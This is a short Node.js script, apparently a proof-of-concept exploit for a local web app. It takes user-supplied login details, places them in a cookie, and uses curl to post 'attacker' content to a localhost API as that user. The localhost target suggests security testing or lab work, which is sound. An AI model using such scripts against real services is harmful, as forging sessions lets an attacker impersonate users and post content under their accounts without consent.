const readline = require('readline');
const { spawn } = require('child_process');
const querystring = require('querystring');
const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

let input = '';
let userData = '';

rl.question('Enter the loginDetails: ', (answer) => {
  input = answer;
  rl.close();

  try {
    userData = JSON.parse(input);
    const cookieData = querystring.escape(JSON.stringify(userData));
    const curlCommand = [
      'curl',
      '-X', 'POST',
      'http://localhost:3000/api/post',
      '-H', 'Content-Type: application/json',
      '-H', `Cookie: loginDetails=${cookieData}`,
      '-d', `{"title": "attacker title","content": "attacker content","loginDetails": ${JSON.stringify(userData)}}`
    ];

    const curlProcess = spawn(curlCommand[0], curlCommand.slice(1));
    curlProcess.stdout.on('data', (data) => {
      console.log('stdout:', data.toString());
    });

    curlProcess.stderr.on('data', (data) => {
      console.error('stderr:', data.toString());
    });

    curlProcess.on('close', (code) => {
      console.log(`Curl process exited with code ${code}`);
    });
  } catch (error) {
    console.error('Invalid input. Please provide a valid JSON object.');
  }
});
